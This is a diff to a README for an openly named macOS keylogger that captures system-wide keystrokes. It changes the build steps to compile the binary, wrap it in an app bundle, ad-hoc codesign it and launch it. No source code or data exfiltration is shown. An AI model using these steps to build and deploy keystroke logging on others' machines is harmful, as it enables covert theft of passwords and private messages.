@@ -4,7 +4,11 @@ A simple macOS keylogger written in pure C. It captures all keystrokes system-wi
 
 ## Compilation
 
-```
-clang -o keylogger main.c -framework ApplicationServices
+```sh
+clang -o keylogger main.c -framework ApplicationServices -framework Carbon
+mkdir -p Keylogger.app/Contents/MacOS
+mv keylogger Keylogger.app/Contents/MacOS/
+codesign --force --deep --sign - Keylogger.app
+open ./Keylogger.app
 ```
 
